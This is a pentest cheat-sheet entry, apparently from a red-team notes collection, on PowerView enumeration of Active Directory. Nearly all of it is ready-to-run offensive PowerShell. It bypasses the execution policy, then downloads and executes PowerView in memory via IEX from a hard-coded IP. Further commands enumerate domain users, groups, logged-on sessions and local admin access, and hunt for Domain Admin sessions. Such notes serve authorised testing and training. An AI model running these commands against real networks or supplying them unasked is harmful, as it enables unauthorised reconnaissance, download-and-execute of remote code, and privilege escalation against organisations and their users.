---
title: PowerView Domain Enumeration
category: ad
subcategory: ad-enum
os: windows
command: Import-Module .\PowerView.ps1
tools: PowerView
---


### Load (file)

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
Import-Module .\PowerView.ps1
```

### Load in-memory

```powershell
$PowerView=(New-Object System.Net.Webclient).DownloadString('http://192.168.45.112/powerview.ps1')
IEX $PowerView
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.112/powerview.ps1')
```

### Domain object enumeration

```powershell
Get-DomainController
Get-DomainComputer | select samaccountname, name
Get-DomainUser | select name, memberof
Get-DomainGroup | select name, member
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainUser -Identity jess
```

### Sessions and logged-on users

```powershell
Get-NetLoggedon | select username
Get-NetLoggedon -ComputerName DC01
Get-NetSession
Get-NetSession -ComputerName files04
```

### Hunt for Domain Admin sessions

```powershell
Invoke-UserHunter
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -GroupName "Domain Admins"
```

### Computer / OS info

```powershell
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

### Local admin access

```powershell
Find-LocalAdminAccess
```

### Old-style "Get-Net*" variants

```powershell
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
```

### Reference

https://powersploit.readthedocs.io/en/latest/Recon/
